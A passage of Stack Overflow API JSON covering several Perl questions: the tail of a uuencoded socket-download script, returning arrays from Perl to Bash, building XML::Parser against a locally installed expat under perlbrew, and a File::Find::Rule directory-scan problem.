EQX,$1&lt;&gt;#!!(@HI.PI]\nM\"FUY(\"1S;V-K970@/2!)3SHZ4V]C:V5T.CI)3D54+3YN97&lt;H4')O=&amp;\\@/3X@\nM(G1C&lt;\"(L(%1Y&lt;&amp;4@/3X@4T]#2U]35%)%04TI.PIR971U&lt;FX@=6YL97-S(\"1S\nM;V-K970[\"B1S;V-K970M/F)L;V-K:6YG*#`I.PIU;FQE&lt;W,@*\"1S;V-K970M\nM/F-O;FYE8W0H)&amp;%D9'(I*0I[\"G5N;&amp;5S&lt;R`H)\"$@/3T@4$]325@Z.D5)3E!2\nM3T=215-3*0I[\"F-L;W-E(\"1S;V-K970[\"G)E='5R;CL*?0I]\"B1W&lt;FET97)S\nM+3YA9&amp;0H)'-O8VME=\"D[\"B1T:6UE;W5T(\"L]('1I;64[\"FUY(\"1S=&amp;5P(#T@\nM,#L*=VAI;&amp;4@*#$I\"GL*24\\Z.E-E;&amp;5C=\"T^&lt;V5L96-T*'5N9&amp;5F+\"!U;F1E\nM9BP@=6YD968L(#`N,#(I.PIM&gt;2`D=W)I=&amp;%B;&amp;4@/2`H24\\Z.E-E;&amp;5C=\"T^\nM&lt;V5L96-T*'5N9&amp;5F+\"`D=W)I=&amp;5R&lt;RP@=6YD968L(#`I*5LQ73L*9F]R96%C\nM:\"!M&gt;2`D:&amp;%N9&amp;QE(\"A`)'=R:71A8FQE*0I[\"FEF(\"@D&lt;W1E&lt;\"`]/2`P*0I[\nM\"B1S=&amp;5P(#T@,2!I9B`D:&amp;%N9&amp;QE+3YC;VYN96-T960[\"GT*:68@*\"1S=&amp;5P\nM(#T](#$I\"GL*;7D@)')E&lt;W5L=\"`]('-Y&lt;W=R:71E(\"@D:&amp;%N9&amp;QE+\"`D8G5F\nM9F5R*3L*:68@*&amp;1E9FEN960@)')E&lt;W5L=\"`F)B`D&lt;F5S=6QT(#X@,\"D*&gt;PIS\nM=6)S='(@*\"1B=69F97(L(#`L(\"1R97-U;'0I(#T@(B([\"FEF(\"@A;&amp;5N9W1H\nM(\"1B=69F97(I\"GL*)')E861E&lt;G,M/F%D9\"@D:&amp;%N9&amp;QE*3L*)'=R:71E&lt;G,M\nM/G)E;6]V92@D:&amp;%N9&amp;QE*3L*)'-T97`@/2`R.PI]\"GT*96QS:68@*\"0A(#T]\nM(%!/4TE8.CI%5T]53$1\"3$]#2RD*&gt;PIN97AT.PI]\"F5L&lt;V4*&gt;PHD=&amp;EM96]U\nM=\"`](#`[\"GT*?0I]\"FUY(\"1R96%D86)L92`](\"A)3SHZ4V5L96-T+3YS96QE\nM8W0H)')E861E&lt;G,L('5N9&amp;5F+\"!U;F1E9BP@,\"DI6S!=.PIF;W)E86-H(&amp;UY\nM(\"1H86YD;&amp;4@*$`D&lt;F5A9&amp;%B;&amp;4I\"GL*;F5X=\"!I9B`D&lt;W1E&lt;\"`\\(#([\"FUY\nM(\"1R97-U;'0[\"FEF(\"@D&lt;W1E&lt;\"`]/2`R*0I[\"B1R97-U;'0@/2!S&gt;7-R96%D\nM(\"@D:&amp;%N9&amp;QE+\"`D8G5F9F5R+\"`X,3DR+\"!L96YG=&amp;@@)&amp;)U9F9E&lt;BD[\"GT*\nM96QS90I[\"B1R97-U;'0@/2!S&gt;7-R96%D(\"@D:&amp;%N9&amp;QE+\"`D8G5F9F5R+\"`X\nM,3DR*3L*?0II9B`H,38S.#0@/\"!L96YG=&amp;@@)&amp;)U9F9E&lt;BD*&gt;PHD=&amp;EM96]U\nM=\"`](#`[\"GT*96QS:68@*&amp;1E9FEN960@)')E&lt;W5L=\"D*&gt;PII9B`H)')E&lt;W5L\nM=\"`^(#`I\"GL*:68@*\"1S=&amp;5P(#T](#(I\"GL*;7D@)&amp;]F9G-E=\"`](&amp;EN9&amp;5X\nM(\"@D8G5F9F5R+\"`B7'@P1%QX,$%&lt;&gt;#!$7'@P02(I.PIN97AT(&amp;EF(\"1O9F9S\nM970@/\"`P.PII9B`H;W!E;B`H1BP@(CX^(BP@)&amp;AE861E&lt;BDI\"GL*9FQO8VL@\nM1BP@,CL*8FEN;6]D92!&amp;.PIP&lt;FEN=\"!&amp;('-U8G-T&lt;B`H)&amp;)U9F9E&lt;BP@,\"P@\nM)&amp;]F9G-E=\"D[\"F-L;W-E($8[\"GT*&lt;W5B&lt;W1R(\"@D8G5F9F5R+\"`P+\"`D;V9F\nM&lt;V5T(\"L@-\"D@/2`B(CL*)'-T97`@/2`S.PI]\"FEF(\"@D&lt;W1E&lt;\"`]/2`S*0I[\nM\"FEF(\"AL96YG=&amp;@@)&amp;)U9F9E&lt;BD*&gt;PII9B`H;W!E;B`H1BP@(CX^(BP@)&amp;-O\nM;G1E;G0I*0I[\"F9L;V-K($8L(#([\"F)I;FUO9&amp;4@1CL*&lt;')I;G0@1B`D8G5F\nM9F5R.PIC;&amp;]S92!&amp;.PI]\"B1B=69F97(@/2`B(CL*?0I]\"FYE&gt;'0[\"GT*)'1I\nM;65O=70@/2`P.PI]\"F5L&lt;VEF(\"@D(2`]/2!03U-)6#HZ15=/54Q$0DQ/0TLI\nM\"GL*;F5X=#L*?0IE;'-E\"GL*)'1I;65O=70@/2`P.PI]\"GT*:68@*\"1T:6UE\nM;W5T(#P@=&amp;EM92D*&gt;PIF;W)E86-H(&amp;UY(\"1H86YD;&amp;4@*\"1W&lt;FET97)S+3YH\nM86YD;&amp;5S+\"`D&lt;F5A9&amp;5R&lt;RT^:&amp;%N9&amp;QE&lt;RD*&gt;PHD=W)I=&amp;5R&lt;RT^&lt;F5M;W9E\nM*\"1H86YD;&amp;4I(&amp;EF(\"1W&lt;FET97)S+3YE&gt;&amp;ES=',H)&amp;AA;F1L92D[\"B1R96%D\nM97)S+3YR96UO=F4H)&amp;AA;F1L92D@:68@)')E861E&lt;G,M/F5X:7-T&lt;R@D:&amp;%N\nE9&amp;QE*3L*8VQO&lt;V4@)&amp;AA;F1L93L*?0IR971U&lt;FX[\"GT*?0I]\"@``\n</code></pre>\n"}, {"tags": ["bash", "perl"], "answers": [{"tags": [], "owner": {"reputation": 32176, "user_id": 2173773, "user_type": "registered", "accept_rate": 86, "profile_image": "https://i.stack.imgur.com/M8yh6.jpg?s=128&g=1", "display_name": "H&#229;kon H&#230;gland", "link": "https://stackoverflow.com/users/2173773/h%c3%a5kon-h%c3%a6gland"}, "is_accepted": false, "score": 1, "last_activity_date": 1532936385, "creation_date": 1532936385, "answer_id": 51589114, "question_id": 51589035, "link": "https://stackoverflow.com/questions/51589035/return-array-from-perl-to-bash/51589114#51589114", "title": "return array from perl to bash", "body": "<p>Here is one way using Bash <a href=\"https://www.gnu.org/software/bash/manual/bash.html#Word-Splitting\" rel=\"nofollow noreferrer\">word splitting</a>, it will split the string on white space into the new array <code>array</code>:</p>\n\n<pre><code>array_str=$(perl -E '@a = 1..5; say \"@a\"')\narray=( $array_str )\n\nfor item in ${array[@]} ; do\n    echo \": $item\"\ndone\n</code></pre>\n\n<p><strong>Output</strong>:</p>\n\n<pre><code>: 1\n: 2\n: 3\n: 4\n: 5\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 2833, "user_id": 9300627, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/c7a38cf029222bcf1d902e6b2759ffeb?s=128&d=identicon&r=PG", "display_name": "haukex", "link": "https://stackoverflow.com/users/9300627/haukex"}, "is_accepted": true, "score": 5, "last_activity_date": 1532938867, "last_edit_date": 1532938867, "creation_date": 1532936435, "answer_id": 51589124, "question_id": 51589035, "link": "https://stackoverflow.com/questions/51589035/return-array-from-perl-to-bash/51589124#51589124", "title": "return array from perl to bash", "body": "<p>In the shell (and in Perl), backticks (<code>``</code>) capture the output of a command. However, Perl's <a href=\"http://perldoc.perl.org/functions/return.html\" rel=\"nofollow noreferrer\"><code>return</code></a> is normally for returning variables from subroutines - it does not produce output, so you probably want <a href=\"http://perldoc.perl.org/functions/print.html\" rel=\"nofollow noreferrer\"><code>print</code></a> instead. Also, in <code>bash</code>, <a href=\"http://tldp.org/LDP/Bash-Beginners-Guide/html/sect_10_02.html\" rel=\"nofollow noreferrer\">array variables</a> are declared with parentheses. So this works for me:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>$ ARRAY=(`perl -wMstrict -le 'my @array = qw/foo bar baz/; print \"@array\"'`); \\\n    echo \"&lt;${ARRAY[*]}&gt; 0=${ARRAY[0]} 1=${ARRAY[1]} 2=${ARRAY[2]}\"\n&lt;foo bar baz&gt; 0=foo 1=bar 2=baz\n</code></pre>\n\n<p>In Perl, interpolating an array into a string (like <code>\"@array\"</code>) will join the array with the special variable <a href=\"http://perldoc.perl.org/perlvar.html#$&quot;\" rel=\"nofollow noreferrer\"><code>$\"</code></a> in between elements; that variable defaults to a single space. If you simply <code>print @array</code>, then the array elements will be joined by the variable <a href=\"http://perldoc.perl.org/perlvar.html#$,\" rel=\"nofollow noreferrer\"><code>$,</code></a>, which is <code>undef</code> by default, meaning no space between the elements. This probably explains the behavior you mentioned (<em>\"the array vars connected with no spaces\"</em>).</p>\n\n<p>Note that the above will <strong>not</strong> work the way you expect if the elements of the array contain whitespace, because <code>bash</code> will split them into separate array elements. If your array does contain whitespace, then please provide an <a href=\"https://stackoverflow.com/help/mcve\">MCVE</a> with sample data so we can perhaps make an alternative suggestion of how to return that back to <code>bash</code>. For example:</p>\n\n<pre class=\"lang-bash prettyprint-override\"><code>( # subshell so IFS is only affected locally\n    IFS=$'\\n'\n    ARRAY=(`perl -wMstrict -e 'my @array = (\"foo\",\"bar\",\"quz baz\"); print join \"\\n\", @array'`)\n    echo \"0=&lt;${ARRAY[0]}&gt; 1=&lt;${ARRAY[1]}&gt; 2=&lt;${ARRAY[2]}&gt;\"\n)\n</code></pre>\n\n<p>Outputs: <code>0=&lt;foo&gt; 1=&lt;bar&gt; 2=&lt;quz baz&gt;</code></p>\n"}], "owner": {"reputation": 613, "user_id": 8648164, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/1881f92bd5b569a12918214b6f10b1bb?s=128&d=identicon&r=PG&f=1", "display_name": "H.Epstein", "link": "https://stackoverflow.com/users/8648164/h-epstein"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 325, "favorite_count": 0, "accepted_answer_id": 51589124, "answer_count": 2, "score": 1, "last_activity_date": 1532938867, "creation_date": 1532935994, "last_edit_date": 1532936910, "question_id": 51589035, "link": "https://stackoverflow.com/questions/51589035/return-array-from-perl-to-bash", "title": "return array from perl to bash", "body": "<p>I'm trying to get back an array from perl to bash. </p>\n\n<p>My perl scrip has an array and then I use <code>return(@arr)</code></p>\n\n<p>from my bash script I use </p>\n\n<pre><code>VAR = `perl....\n</code></pre>\n\n<p>when I echo VAR \nI get the aray as 1 long string with all the array vars connected with no spaces.</p>\n\n<p>Thanks</p>\n"}, {"tags": ["perl", "perlbrew"], "comments": [{"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1532925111, "post_id": 51586919, "comment_id": 90139271, "body": "<a href=\"https://stackoverflow.com/a/15504710/1848654\">stackoverflow.com/a/15504710/1848654</a>?"}, {"owner": {"reputation": 327, "user_id": 3078982, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/vKL84.png?s=128&g=1", "display_name": "iolympian", "link": "https://stackoverflow.com/users/3078982/iolympian"}, "reply_to_user": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1532925597, "post_id": 51586919, "comment_id": 90139357, "body": "I tried that, but that solution didn&#39;t work for me.  I have XML::SAX installed and still get the error.  $ cpanm XML::SAX XML::SAX is up to date. (1.00) $ cpanm XML::Simple &lt;stuff&gt; Installing XML::Parser failed. See /home/user1/.cpanm/work/1532925534.21007/build.log for details. Retry with --force to force install it. ! Installing the dependencies failed: Module &#39;XML::Parser&#39; is not installed ! Bailing out the installation for XML-SAX-Expat-0.51. ! Installing the dependencies failed: Module &#39;XML::SAX::Expat&#39; is not installed ! Bailing out the installation for XML-Simple-2.25."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1532925728, "post_id": 51586919, "comment_id": 90139388, "body": "To install XML::Parser, you need the expat library installed, as well as the header files for the expat library"}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 0, "creation_date": 1532927044, "post_id": 51586919, "comment_id": 90139659, "body": "There are environment variables both for header files and the runtime linker (for <code>.so</code> files), but I forget what they&#39;re called."}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 0, "creation_date": 1532927066, "post_id": 51586919, "comment_id": 90139665, "body": "<code>.&#47;configure --prefix=&#47;home&#47;user1</code> would make far more sense than <code>.&#47;configure --prefix=&#47;home&#47;user1&#47;perl5&#47;perlbrew&#47;perls&#47;perl-5.10.1&#47;</code>. It seems you simply forgot to tell programs where to look. For <code>gcc</code>, <a href=\"https://gcc.gnu.org/onlinedocs/gcc/Environment-Variables.html\" rel=\"nofollow noreferrer\">it looks like</a> env var <code>CPATH</code> can be used to specify the include dir, and env var <code>LIBRARY_PATH</code> can be used to specify the library dir."}, {"owner": {"reputation": 17713, "user_id": 226648, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/3196df423fd95dc4fce7dfadb8ec9953?s=128&d=identicon&r=PG", "display_name": "el.pescado", "link": "https://stackoverflow.com/users/226648/el-pescado"}, "edited": false, "score": 0, "creation_date": 1532932116, "post_id": 51586919, "comment_id": 90141369, "body": "Possible duplicate of <a href=\"https://stackoverflow.com/questions/15484620/installing-xmlparser-requires-expat-h\">Installing XML::Parser requires expat.h</a>"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 2, "creation_date": 1532939894, "post_id": 51586919, "comment_id": 90145194, "body": "Do you really want to install XML::Simple? It&#39;s really not as simple as its name might imply and even the documentation <a href=\"https://metacpan.org/pod/XML::Simple#STATUS-OF-THIS-MODULE\" rel=\"nofollow noreferrer\">discourages its use</a>."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "reply_to_user": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 1, "creation_date": 1532947245, "post_id": 51586919, "comment_id": 90149476, "body": "@Dave: Indeed. <code>XML::Simplistic</code> or <code>XML::Naive</code> might be more appropriate!"}, {"owner": {"reputation": 327, "user_id": 3078982, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/vKL84.png?s=128&g=1", "display_name": "iolympian", "link": "https://stackoverflow.com/users/3078982/iolympian"}, "edited": false, "score": 0, "creation_date": 1533148753, "post_id": 51586919, "comment_id": 90244824, "body": "Unfortunately, it&#39;s out of current scope to change the library. Within scope in 2 weeks, but out of scope for the server install of the code base."}], "answers": [{"tags": [], "owner": {"reputation": 38072, "user_id": 46395, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/5ce828f20abb195ef5d971205ee36c27?s=128&d=identicon&r=PG", "display_name": "daxim", "link": "https://stackoverflow.com/users/46395/daxim"}, "is_accepted": false, "score": 3, "last_activity_date": 1532931747, "creation_date": 1532931747, "answer_id": 51588056, "question_id": 51586919, "link": "https://stackoverflow.com/questions/51586919/cant-install-xmlsimple-on-perlbrew/51588056#51588056", "title": "Can&#39;t install XML::Simple on Perlbrew", "body": "<p>Install <code>XML::Parser</code> manually and tell <code>ExtUtils::MakeMaker</code> where to find the C libraries. See <a href=\"http://p3rl.org/ExtUtils::MakeMaker#INC\" rel=\"nofollow noreferrer\">INC</a> and <a href=\"http://p3rl.org/ExtUtils::MakeMaker#LIBS\" rel=\"nofollow noreferrer\">LIBS</a>.</p>\n\n<pre><code>cpanm --look XML::Parser\nPERLPREFIX=/home/user1/perl5/perlbrew/perls/perl-5.10.1/\nperl Makefile.PL INC=-I$PERLPREFIX/include LIBS=-L$PERLPREFIX/lib\nmake &amp;&amp; make test &amp;&amp; make install\n</code></pre>\n\n<hr>\n\n<p>If you use cpan instead of cpanm, you can make this hands-off and permanent. Set the <a href=\"http://p3rl.org/CPAN#Config-Variables\" rel=\"nofollow noreferrer\">option <code>makepl_arg</code></a>, e.g. by running at the CPAN shell prompt):</p>\n\n<pre><code>o conf makepl_arg \"INC=-I/home/user1/perl5/perlbrew/perls/perl-5.10.1/include LIBS=-L/home/user1/perl5/perlbrew/perls/perl-5.10.1/lib\"\no conf commit\n</code></pre>\n\n<hr>\n\n<p>P.S. <a href=\"https://github.com/libexpat/libexpat/releases/download/R_2_2_5/expat-2.2.5.tar.bz2\" rel=\"nofollow noreferrer\">expat 2.2.5</a> is out</p>\n"}], "owner": {"reputation": 327, "user_id": 3078982, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/vKL84.png?s=128&g=1", "display_name": "iolympian", "link": "https://stackoverflow.com/users/3078982/iolympian"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 721, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1532931747, "creation_date": 1532924336, "last_edit_date": 1532925050, "question_id": 51586919, "link": "https://stackoverflow.com/questions/51586919/cant-install-xmlsimple-on-perlbrew", "title": "Can&#39;t install XML::Simple on Perlbrew", "body": "<p>I'm trying to install XML::Simple under Perlbrew but am hitting an error that seems like it requires root access to fix. However, the whole purpose of using perlbrew (or one of them, at least) is to disassociate your perl environment from the OS installed perl version.</p>\n\n<p>I've installed perlbrew (5.10.1, legacy code requirement) and several modules. It is currently functioning as expected.  However, I get an error when trying to install XML::Simple.</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>$ cpanm XML::Simple\n--&gt; Working on XML::Simple\nFetching http://www.cpan.org/authors/id/G/GR/GRANTM/XML-Simple-2.25.tar.gz ... OK\nConfiguring XML-Simple-2.25 ... OK\n==&gt; Found dependencies: XML::SAX::Expat\n--&gt; Working on XML::SAX::Expat\nFetching http://www.cpan.org/authors/id/B/BJ/BJOERN/XML-SAX-Expat-0.51.tar.gz ... OK\nConfiguring XML-SAX-Expat-0.51 ... OK\n==&gt; Found dependencies: XML::Parser\n--&gt; Working on XML::Parser\nFetching http://www.cpan.org/authors/id/T/TO/TODDR/XML-Parser-2.44.tar.gz ... OK\nConfiguring XML-Parser-2.44 ... OK\nBuilding and testing XML-Parser-2.44 ... FAIL\n! Installing XML::Parser failed. See /home/user1/.cpanm/work/1532923694.18203/build.log for details. Retry with --force to force install it.\n! Installing the dependencies failed: Module 'XML::Parser' is not installed\n! Bailing out the installation for XML-SAX-Expat-0.51.\n! Installing the dependencies failed: Module 'XML::SAX::Expat' is not installed\n! Bailing out the installation for XML-Simple-2.25.\n$\n</code></pre>\n\n<p>Here's the output of the log file (cut down to the pertinent part):</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>cp Expat.pm ../blib/lib/XML/Parser/Expat.pm\nRunning Mkbootstrap for Expat ()\nchmod 644 \"Expat.bs\"\n\"/home/user1/perl5/perlbrew/perls/perl-5.10.1/bin/perl\" -MExtUtils::Command::MM -e 'cp_nonempty' -- Expat.bs ../blib/arch/auto/XML/Parser/Expat/Expat.bs 644\n\"/home/user1/perl5/perlbrew/perls/perl-5.10.1/bin/perl\" \"/home/user1/perl5/perlbrew/perls/perl-5.10.1/lib/5.10.1/ExtUtils/xsubpp\" -noprototypes -typemap '/home/user1/perl5/perlbrew/perls/perl-5.10.1/lib/5.10.1/ExtUtils/typemap' -typemap /home/user1/.cpanm/work/1532923694.18203/XML-Parser-2.44/Expat/typemap'  Expat.xs &gt; Expat.xsc\nmv Expat.xsc Expat.c\ncc -c   -m32 -march=i686 -fno-strict-aliasing -pipe -fstack-protector -I/usr/local/include -D_LARGEFILE_SOURCE -D_FILE_OFFSET_BITS=64 -O2   -DVERSION=\\\"2.44\\\" -DXS_VERSION=\\\"2.44\\\" -fPIC \"-I/home/user1/perl5/perlbrew/perls/perl-5.10.1/lib/5.10.1/x86_64-linux/CORE\"   Expat.c\nExpat.xs:12:19: fatal error: expat.h: No such file or directory\n #include &lt;expat.h&gt;\n                   ^\ncompilation terminated.\nmake[1]: *** [Expat.o] Error 1\nmake[1]: Leaving directory `/home/user1/.cpanm/work/1532923694.18203/XML-Parser-2.44/Expat'\nmake: *** [subdirs] Error 2\n-&gt; FAIL Installing XML::Parser failed. See /home/user1/.cpanm/work/1532923694.18203/build.log for details. Retry with --force to force install it.\n-&gt; FAIL Installing the dependencies failed: Module 'XML::Parser' is not installed\n-&gt; FAIL Bailing out the installation for XML-SAX-Expat-0.51.\n-&gt; FAIL Installing the dependencies failed: Module 'XML::SAX::Expat' is not installed\n-&gt; FAIL Bailing out the installation for XML-Simple-2.25.\n~\n</code></pre>\n\n<p>I have tried installing expat locally via:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>wget https://sourceforge.net/projects/expat/files/expat/2.2.4/expat-2.2.4.tar.bz2\ntar xjf expat-2.2.4.tar.bz2\ncd expat-2.2.4\n./configure --prefix=/home/user1/perl5/perlbrew/perls/perl-5.10.1/\nmake\nmake install\n</code></pre>\n\n<p>I've verified that expat.h is in ~/perl5/perlbrew/perls/perl-5.10.1/include.  I updated my path to include that location.</p>\n\n<p>Every fix I see is to install expat via the operating system tools (for the various flavors). </p>\n\n<p>The issue is that I don't have root access and while I can technically ask the admin to install it, my project requires a solution that doesn't require root access as it will be copied through multiple environments and servers.</p>\n\n<p>Is there a way to install XML::Simple without expat? Or a way to install expat in perlbrew such that XML::Simple will find it and use it?</p>\n"}, {"tags": ["linux", "perl", "suse"], "comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1532898922, "post_id": 51584473, "comment_id": 90134733, "body": "Is your directory a symlink? Does <code>-&gt;extras({ follow =&gt; 1 })</code> help?"}, {"owner": {"reputation": 11, "user_id": 1943866, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18b01ff2ce4c29049d50523ee176587?s=128&d=identicon&r=PG", "display_name": "Kris", "link": "https://stackoverflow.com/users/1943866/kris"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1532900091, "post_id": 51584473, "comment_id": 90134994, "body": "Its not a symlink, i checked that. Its a normal directory. I will try with the option you mentioned."}, {"owner": {"reputation": 11, "user_id": 1943866, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18b01ff2ce4c29049d50523ee176587?s=128&d=identicon&r=PG", "display_name": "Kris", "link": "https://stackoverflow.com/users/1943866/kris"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1532901326, "post_id": 51584473, "comment_id": 90135256, "body": "It did not work. I tried with my @files = File::Find::Rule-&gt;extras({ follow =&gt; 1 })-&gt;file()-&gt;name(@types)-&gt;in(&quot;$dir&quot;);"}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1532929160, "post_id": 51584473, "comment_id": 90140257, "body": "Perhaps a silly question, but did you check that the subdirectory is indeed &quot;<i>created on the fly</i>&quot; ?"}, {"owner": {"reputation": 11, "user_id": 1943866, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18b01ff2ce4c29049d50523ee176587?s=128&d=identicon&r=PG", "display_name": "Kris", "link": "https://stackoverflow.com/users/1943866/kris"}, "edited": false, "score": 0, "creation_date": 1532937709, "post_id": 51584473, "comment_id": 90144147, "body": "yes, it is created on the fly. I have checked it."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1532940860, "post_id": 51584473, "comment_id": 90145705, "body": "To confirm my understanding: When you create that directory (and files in it) by hand then the code you have works; But when it is created by the program (&quot;<i>on the fly</i>&quot;) ... then it doesn&#39;t work?  Did you test with the exact same program -- once you make things by hand and run it and then you (delete that and) run it?"}, {"owner": {"reputation": 11, "user_id": 1943866, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18b01ff2ce4c29049d50523ee176587?s=128&d=identicon&r=PG", "display_name": "Kris", "link": "https://stackoverflow.com/users/1943866/kris"}, "edited": false, "score": 0, "creation_date": 1532942235, "post_id": 51584473, "comment_id": 90146455, "body": "Yes, I have simply copied the directory and its contents  which are created on the fly to my local disk and used the same code snippet which i wrote in a local script. Here it works. But it doesn&#39;t work in the setup where the same code gets called after the directory and its content are created. I have double checked every line and the $dir i pass in both cases to confirm that it is correct. As i did a print of all files present in that $dir and observe it prints all files except the sub-directory. i checked manually in the $dir to see if the sub-directory was not present but it is present."}, {"owner": {"reputation": 53041, "user_id": 4653379, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b3953dbedd0dabff5cbc3db9b0835b14?s=128&d=identicon&r=PG&f=1", "display_name": "zdim", "link": "https://stackoverflow.com/users/4653379/zdim"}, "edited": false, "score": 0, "creation_date": 1532944192, "post_id": 51584473, "comment_id": 90147703, "body": "It seems that your &quot;<i>actual setup</i>&quot; ends up with wrong name(s), for some reason (since the directory is there as you say). Try to check right before the search, <code>if (not -d $subdir) { ... }</code> where <code>$subdir</code> is composed with other variables that you use (perhaps <code>$dir&#47;sub_dir_name</code> or such)?  You&#39;d have to show/tell us about your &quot;<i>actual setup</i>&quot; for more than (better) guesses."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1532946718, "post_id": 51584473, "comment_id": 90149201, "body": "I think you need to show the code that creates and populates the missing directory as well."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1532946839, "post_id": 51584473, "comment_id": 90149266, "body": "It&#39;s not the source of your problem, but don&#39;t use ampersands <code>&amp;</code> to call subroutines. Just <code>check_dir($_)</code> is correct."}, {"owner": {"reputation": 3509, "user_id": 4243840, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aaeabd769bae1bf82fd4b8882fed6653?s=128&d=identicon&r=PG", "display_name": "JGNI", "link": "https://stackoverflow.com/users/4243840/jgni"}, "edited": false, "score": 0, "creation_date": 1532957991, "post_id": 51584473, "comment_id": 90156368, "body": "This is a comment on your code style. It&#39;s better practice to use a lexical variable for a directory handle. So your lines for reading in the directory would better be written:-  warn &quot;cannot traverse directory $dir\\n&quot;      unless (opendir my $D,$dir);  my @files = map {$dir.&#39;/&#39;.$_} grep {!m/^\\.{1,2}$/} readdir $D;  closedir $D;"}, {"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, 